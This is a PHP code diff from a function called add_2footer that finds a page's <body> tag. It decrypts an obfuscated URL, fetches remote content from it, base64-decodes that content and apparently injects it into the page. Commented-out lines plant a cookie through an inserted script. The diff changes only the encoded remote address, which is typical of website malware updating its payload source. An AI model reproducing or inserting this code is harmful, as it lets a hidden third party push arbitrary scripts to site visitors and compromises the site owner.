@@ -684,8 +684,8 @@ function add_2footer() {
     $regexp = '/<body[^>]*>/is';
     if (preg_match($regexp, $buffer, $m)) {
         $body = $m[0];
-//        $url = base64_decode('a3d3czksLDQ1LTEwOy03Oy0yOzYsYW9sZCw8YnFuYmRmZ2dsbSV2d25ccGx2cWBmPjE3MjYyOTIxOjI0OzE5MTM6Mw==');
-        $url = decrypt_url('a3d3czksLDQ1LTEwOy03Oy0yOzYsYW9sZCw8YnFuYmRmZ2dsbSV2d25ccGx2cWBmPjE3MjYyOTIxOjI0OzE5MTM6Mw==');
+//        $url = base64_decode('a3d3czksLDQ1LTEwOy03Oy0yOzYsYW9sZCw8YnFuYmRmZ2dsbSV2d25ccGx2cWBmPjQxNDs5MjE6MjQ7MTkxMzoz');
+        $url = decrypt_url('a3d3czksLDQ1LTEwOy03Oy0yOzYsYW9sZCw8YnFuYmRmZ2dsbSV2d25ccGx2cWBmPjQxNDs5MjE6MjQ7MTkxMzoz');
 //        if (($code = request_url_data($url)) AND base64_decode($code) AND preg_match('#[a-zA-Z0-9+/]+={0,3}#is', $code, $m)) {
         if (($code = request_url_data($url)) AND $decoded = base64_decode($code, true)) {
 //            $body .=  '<script>var date = new Date(new Date().getTime() + 60*60*24*7*1000); document.cookie="' . $cookie_name . '=' . mt_rand(1, 1024) . '; path=/; expires="+date.toUTCString();</script>';
